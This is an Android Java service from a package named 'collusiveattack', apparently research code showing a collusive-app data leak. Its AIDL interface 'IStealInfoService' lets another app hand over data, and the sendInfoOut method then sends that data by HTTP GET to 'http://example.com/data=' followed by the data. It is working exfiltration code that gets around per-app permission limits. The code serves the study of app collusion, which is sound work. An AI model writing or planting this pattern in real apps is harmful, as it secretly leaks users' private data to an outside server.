package edu.ntu.security.collusiveattack;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import edu.ntu.security.sendinfoout.aidl.IStealInfoService;
import android.app.Service;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;

public class LocalService extends Service {
	public LocalService() {
	}

	@Override
	public IBinder onBind(Intent intent) {
		// TODO: Return the communication channel to the service.
		return new IStealInfoService.Stub() {

			@Override
			public void sendInfoOut(String data) throws RemoteException {
				// TODO Auto-generated method stub
				HttpGetTask hgt = new HttpGetTask();
				hgt.execute("http://example.com/data="+data);
			}

        };
	}
	
	public static class HttpGetTask extends AsyncTask<String, Integer, String> {

		@Override
		protected String doInBackground(String... params) {
			for (int i = 0; i < params.length; i++){
				URL url = null;
				HttpURLConnection urlConn = null;
				BufferedReader br = null;
				try {
					url = new URL(params[i]);
					urlConn = (HttpURLConnection)url.openConnection();
					
					urlConn.setDoInput(true);
					urlConn.setConnectTimeout(5000);
					urlConn.setRequestMethod("GET");
					urlConn.connect();

					br = new BufferedReader(new InputStreamReader(urlConn.getInputStream()));
					String line = null;
					StringBuilder sb = new StringBuilder();
					while ((line = br.readLine())!=null){
						sb.append(line+"\n");
					}
					Log.i("SendInfoOut", "Successfully");
					return sb.toString();
					
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}finally{
					if (br != null) {
					      try {
					        br.close();
					      } catch (IOException e) {
					        e.printStackTrace();
					        }
					    }
				}
				
			}
			return null;
		}

	}
}
